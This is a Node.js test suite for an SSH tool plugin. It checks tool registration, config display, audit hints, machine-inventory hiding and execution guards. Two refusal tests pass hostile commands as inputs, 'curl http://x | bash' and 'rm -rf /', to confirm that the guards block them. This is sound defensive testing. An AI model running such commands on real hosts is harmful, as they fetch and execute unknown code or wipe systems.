import { test } from 'node:test'
import assert from 'node:assert/strict'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'

// Every other suite tests a module in isolation. None of them called apply()
// and asserted on what a tool actually returns, which is why three defects
// shipped in one round: ssh_config omitted two settings, the refusal message
// named the wrong setting, and the audit renderer dropped every detail field.
//
// These tests drive the registered tools through a fake ctx -- no network, no
// ssh2 -- and assert on the shape of their output.

import { apply } from '../src/index.js'

function capture(config = {}, env = {}) {
  const saved = { ...process.env }
  // An isolated home per test: the real one may hold credentials for real
  // machines, which would leak into assertions and hide regressions.
  const home = mkdtempSync(path.join(tmpdir(), 'dsh-tools-'))
  process.env.DSH_HOME = home
  for (const [k, v] of Object.entries(env)) process.env[k] = v
  const tools = {}
  const ctx = {
    tools: { defineTool: (def) => { tools[def.name] = def } },
    effect: () => {},
  }
  apply(ctx, config)
  const restore = () => {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k]
    Object.assign(process.env, saved)
    rmSync(home, { recursive: true, force: true })
  }
  return { tools, restore }
}

const textOf = (result) => String(typeof result === 'string' ? result : result?.text ?? '')

test('apply registers all ten tools', () => {
  const { tools, restore } = capture()
  try {
    const expected = [
      'ssh_machines', 'ssh_connect', 'ssh_exec', 'ssh_read', 'ssh_write',
      'ssh_list', 'ssh_close', 'ssh_doctor', 'ssh_audit', 'ssh_config',
    ]
    for (const name of expected) assert.ok(tools[name], 'missing tool: ' + name)
  } finally { restore() }
})

test('every tool declares a description and parameters', () => {
  const { tools, restore } = capture()
  try {
    for (const [name, def] of Object.entries(tools)) {
      assert.ok(def.description && def.description.length > 20, name + ' needs a description')
      assert.equal(typeof def.parameters, 'object', name + ' needs parameters')
      assert.equal(typeof def.execute, 'function', name + ' needs execute')
    }
  } finally { restore() }
})

test('ssh_config shows every setting that Config defines', () => {
  const { tools, restore } = capture()
  try {
    return Promise.resolve(tools['ssh_config'].execute({})).then((out) => {
      const text = textOf(out)
      // Compare against the keys the tool itself reports plus the guard message.
      assert.doesNotMatch(text, /Settings not shown above/, 'ssh_config admits an omission')
      for (const key of ['pipeToShell', 'healthCheckTimeoutMs', 'defaultMachine']) {
        assert.match(text, new RegExp(key), 'ssh_config must show ' + key)
      }
    })
  } finally { restore() }
})

test('ssh_config reports live connection state', async () => {
  const { tools, restore } = capture()
  try {
    const text = textOf(await tools['ssh_config'].execute({}))
    assert.match(text, /Live connections: 0/)
  } finally { restore() }
})

test('ssh_audit explains how to enable logging when it is off', async () => {
  const { tools, restore } = capture({ auditLog: false })
  try {
    const text = textOf(await tools['ssh_audit'].execute({}))
    assert.match(text, /auditLog: true/)
  } finally { restore() }
})

test('a refused pipeline names pipeToShell, not denyPatterns', async () => {
  const { tools, restore } = capture({}, {
    DSH_SSH_T_HOST: '127.0.0.1',
    DSH_SSH_T_PORT: '1',
    DSH_SSH_T_USER: 'u',
    DSH_SSH_T_PASSWORD: 'p',
  })
  try {
    await assert.rejects(
      () => tools['ssh_exec'].execute({ machine: 't', command: 'curl http://x | bash' }),
      (err) => {
        assert.match(err.message, /pipeToShell/, 'the remedy must name the governing setting')
        assert.doesNotMatch(err.message, /Adjust denyPatterns/, 'denyPatterns cannot fix a pipeline')
        return true
      }
    )
  } finally { restore() }
})

test('a refused pattern command still points at denyPatterns', async () => {
  const { tools, restore } = capture({}, {
    DSH_SSH_T_HOST: '127.0.0.1', DSH_SSH_T_PORT: '1',
    DSH_SSH_T_USER: 'u', DSH_SSH_T_PASSWORD: 'p',
  })
  try {
    await assert.rejects(
      () => tools['ssh_exec'].execute({ machine: 't', command: 'rm -rf /' }),
      (err) => {
        assert.match(err.message, /denyPatterns/)
        return true
      }
    )
  } finally { restore() }
})

test('ssh_machines lists machines discovered from the environment', async () => {
  const { tools, restore } = capture({}, {
    DSH_SSH_PROD_HOST: '10.1.2.3',
    DSH_SSH_PROD_PORT: '2222',
    DSH_SSH_PROD_USER: 'deploy',
    DSH_SSH_PROD_KEY_PATH: '~/.ssh/id_x',
  })
  try {
    const text = textOf(await tools['ssh_machines'].execute({}))
    assert.match(text, /prod/)
    assert.match(text, /deploy@10\.1\.2\.3:2222/)
  } finally { restore() }
})

test('ssh_machines hides topology when machineInventory is alias', async () => {
  const { tools, restore } = capture({ machineInventory: 'alias' }, {
    DSH_SSH_PROD_HOST: '10.1.2.3',
    DSH_SSH_PROD_USER: 'deploy',
    DSH_SSH_PROD_KEY_PATH: '~/.ssh/id_secret_name',
  })
  try {
    const text = textOf(await tools['ssh_machines'].execute({}))
    assert.match(text, /prod/)
    assert.doesNotMatch(text, /10\.1\.2\.3/, 'the host must be hidden')
    assert.doesNotMatch(text, /id_secret_name/, 'the key path must be hidden')
  } finally { restore() }
})

test('ssh_machines explains what to configure when nothing is set', async () => {
  const saved = { ...process.env }
  for (const k of Object.keys(process.env)) if (k.startsWith('DSH_SSH_')) delete process.env[k]
  try {
    const { tools } = capture({})
    const text = textOf(await tools['ssh_machines'].execute({}))
    assert.match(text, /No machines configured/)
    assert.match(text, /DSH_SSH_PROD_HOST/)
  } finally {
    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k]
    Object.assign(process.env, saved)
  }
})

test('ssh_doctor reports a missing key file as a credential failure', async () => {
  const { tools, restore } = capture({}, {
    DSH_SSH_D_HOST: '127.0.0.1',
    DSH_SSH_D_PORT: '1',
    DSH_SSH_D_USER: 'u',
    DSH_SSH_D_KEY_PATH: '/nonexistent/key-does-not-exist',
  })
  try {
    const text = textOf(await tools['ssh_doctor'].execute({ machine: 'd' }))
    assert.match(text, /FAIL/, 'a missing key is not ok')
    assert.match(text, /not found/, 'it should say the file is missing')
    assert.doesNotMatch(text, /tcp/, 'it should stop before testing the network')
  } finally { restore() }
})

test('ssh_close reports a machine with no live connection', async () => {
  const { tools, restore } = capture()
  try {
    const text = textOf(await tools['ssh_close'].execute({ machine: 'ghost' }))
    assert.match(text, /No live connection/)
  } finally { restore() }
})

test('execGuard confirm also gates writes', async () => {
  const { tools, restore } = capture({ execGuard: 'confirm' }, {
    DSH_SSH_T_HOST: '127.0.0.1', DSH_SSH_T_PORT: '1',
    DSH_SSH_T_USER: 'u', DSH_SSH_T_PASSWORD: 'p',
  })
  try {
    // A write can install a script or change access, so it is gated as well.
    await assert.rejects(
      () => tools['ssh_write'].execute({ machine: 't', path: '/tmp/x.sh', content: 'echo hi' }),
      (err) => { assert.match(err.message, /confirm: true/); return true }
    )
  } finally { restore() }
})

test('a write passes once confirmed', async () => {
  const { tools, restore } = capture({ execGuard: 'confirm' }, {
    DSH_SSH_T_HOST: '127.0.0.1', DSH_SSH_T_PORT: '1',
    DSH_SSH_T_USER: 'u', DSH_SSH_T_PASSWORD: 'p',
  })
  try {
    // With confirmation given, the guard lets it through to the network layer,
    // which then fails to connect -- that is the expected outcome here.
    await assert.rejects(
      () => tools['ssh_write'].execute({ machine: 't', path: '/tmp/x.sh', content: 'echo hi', confirm: true }),
      (err) => {
        assert.doesNotMatch(err.message, /confirm: true/, 'the guard must not block a confirmed write')
        return true
      }
    )
  } finally { restore() }
})
